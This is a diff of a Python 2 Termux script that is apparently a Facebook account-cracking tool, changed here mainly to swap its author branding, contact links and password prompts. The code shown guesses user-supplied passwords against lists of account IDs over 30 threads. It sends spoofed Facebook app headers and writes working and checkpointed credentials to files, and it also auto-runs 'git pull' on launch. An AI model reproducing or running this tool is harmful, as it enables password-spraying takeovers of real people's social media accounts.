@@ -15,8 +15,8 @@ import cookielib
 import uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Mr.James'
-__copyright = 'All rights reserved . Copyright  Mr.James'
+__author__ = 'Mr.Jam'
+__copyright = 'All rights reserved . Copyright  Mr.Jam'
 os.system('termux-setup-storage')
 
 try:
@@ -28,24 +28,29 @@ bd = random.randint(2e+07, 3e+07)
 sim = random.randint(20000, 40000)
 header = {
     'x-fb-connection-bandwidth': repr(bd),
-    'x-fb-sim-hni': repr(sim),
-    'x-fb-net-hni': repr(sim),
-    'x-fb-connection-quality': 'EXCELLENT',
-    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
-    'content-type': 'application/x-www-form-urlencoded',
-    'x-fb-http-engine': 'Liger' }
+    'x-fb-sim-hni': sim,
+      'x-fb-net-hni': sim,
+      'x-fb-connection-quality': 'EXCELLENT',
+      'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+      'user-agent':
+        'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16',
+      'content-type': 'application/x-www-form-urlencoded',
+      'x-fb-http-engine': 'Liger'
+    }
 os.system('git pull')
 os.system('clear')
 logo = """
-\033[1;97m █████  \033[1;91m██      \033[1;97m██ 
-\033[1;97m██   ██ \033[1;91m██      \033[1;97m██ 
-\033[1;92m███████ \033[1;92m██      \033[1;92m██ 
-\033[1;97m██   ██ \033[1;91m██      \033[1;97m██ 
-\033[1;97m██   ██ \033[1;91m███████ \033[1;97m██
+\033[1;91m   ▄████████    ▄████████ ███▄▄▄▄    ▄█  
+\033[1;97m  ███    ███   ███    ███ ███▀▀▀██▄ ███  
+\033[1;97m  ███    █▀    ███    ███ ███   ███ ███▌ 
+\033[1;97m  ███          ███    ███ ███   ███ ███▌ 
+\033[1;91m▀███████████ ▀███████████ ███   ███ ███▌ 
+\033[1;97m         ███   ███    ███ ███   ███ ███  
+\033[1;97m   ▄█    ███   ███    ███ ███   ███ ███  
+\033[1;91m ▄████████▀    ███    █▀   ▀█   █▀  █▀ -\033[1;97mQUEEN
 \033[1;91m-----------------------------------------------
-\033[1;97m➣ Author : Xtylo Ali Raza x Ayesha Ali
-\033[1;97m➣ Github : https://github.com/Xtylo-x-Ayesha
+\033[1;97m➣ Author : STYLISH QUEEN
+\033[1;97m➣ Github : https://github.com/stylish-queen
 \033[1;97m➣ Fb Page: Jam Shahrukh Official
 \033[1;91m-----------------------------------------------"""
 
@@ -79,7 +84,7 @@ def reg():
         print ' \033[1;92mCopy the id and send to admin'
         print ' \033[1;92mYour id: ' + to
         raw_input('\033[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923051200096')
+        os.system('xdg-open https://m.facebook.com/profile.php?id=100057861373806')
         reg()
 
 
@@ -87,12 +92,12 @@ def reg2():
     os.system('clear')
     print logo
     print '\tApproval not detected'
-    print ' \033[1;92mCopy and press enter , then select whatsapp to continue'
+    print ' \033[1;92mCopy kr k send send kro Facebook py to continue'
     id = uuid.uuid4().hex[:50]
     print ' Your id: ' + id
     print ''
-    raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923051200096')
+    raw_input(' Press enter to go to Facebook ')
+    os.system('xdg-open https://m.facebook.com/profile.php?id=100057861373806')
     sav = open('/sdcard/.hst.txt', 'w')
     sav.write(id)
     sav.close()
@@ -147,7 +152,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \033[1;97m╰─jam➤ ')
+    s = raw_input(' \033[1;97m╰─Sani➤ ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -302,11 +307,11 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\033[1;97m╰─jam➤ ')
+    ms = raw_input('\033[1;97m╰─Sani➤ ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
-        os.system('python2 .shahrukh.py')
+        os.system('python2 .ok.py')
     elif ms == '3':
         v_tok()
     elif ms == '4':
@@ -370,16 +375,16 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \033[1;97m╰─jam➤ ')
+    a_s = raw_input(' \033[1;97m╰─Sani➤ ')
     if a_s == '1':
         os.system('clear')
         print logo
         print '\033[1;93m~~~~ Choice pass cracking ~~~~\033[1;91m'
         print 47 * '-'
-        print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
+        print ' \033[1;93mFor-example:223344,334455,445566,556677\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+        pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
       	pass4 = raw_input(' \033[1;92m[4]Password: ')
         pass5 = raw_input(' \033[1;92m[5]Password: ')
@@ -413,8 +418,8 @@ def a_s():
         print 47 * '-'
         print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+        pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
 	pass4 = raw_input(' \033[1;92m[4]Password: ')
         pass5 = raw_input(' \033[1;92m[5]Password: ')
@@ -448,8 +453,8 @@ def a_s():
         print 47 * '-'
         print ' \033[1;93mFor-example:12,123,1234--223344,334455\033[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+        pass1 = raw_input(' \033[1;92m[1]Password: ')
+        pass2 = raw_input(' \033[1;92m[2]Password: ')
         pass3 = raw_input(' \033[1;92m[3]Password: ')
 	pass4 = raw_input(' \033[1;92m[4]Password: ')
         pass5 = raw_input(' \033[1;92m[5]Password: ')
@@ -473,7 +478,7 @@ def a_s():
     print ' \033[1;97mCrack Running\033[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\033[1;94mXtylo King Of Facebook\033[1;91m'
+    print '\t\033[1;97mSANI Queen Of Facebook\033[1;91m'
     print 47 * '-'
     
     def main(arg):
@@ -481,33 +486,31 @@ def a_s():
         (uid, name) = user.split('|')
         
         try:
-            pass1 = name.lower() + p1
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\033[1;92m[SANI-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass1
+                print '\033[1;93m[SANI-CP] ' + uid + ' | ' + pass1
                 cp = open('HOP_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
             else:
-                pass2 = name.lower() + p2
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\033[1;92m[SANI-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass2
+                    print '\033[1;93m[SANI-CP] ' + uid + ' | ' + pass2
                     cp = open('HOP_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -516,13 +519,13 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print '\033[1;92m[SANI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass3
+                        print '\033[1;93m[SANI-CP] ' + uid + ' | ' + pass3
                         cp = open('HOP_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -531,13 +534,13 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print '\033[1;92m[SANI-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass4
+                            print '\033[1;93m[SANI-CP] ' + uid + ' | ' + pass4
                             cp = open('HOP_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -546,13 +549,13 @@ def a_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\033[1;92m[XTYLO-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print '\033[1;92m[SANI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\033[1;93m[ASHU-CP] ' + uid + ' | ' + pass5
+                                print '\033[1;93m[SANI-CP] ' + uid + ' | ' + pass5
                                 cp = open('HOP_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
@@ -565,7 +568,7 @@ def a_s():
     p = ThreadPool(30)
     p.map(main, id)
     print 47 * '-'
-    print ' \033[1;92mCrack Done'
+    print ' \033[1;92mShahbash Niklo Nikamo'
     print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
     print 47 * '-'
     raw_input(' \033[1;93mPress enter to back')
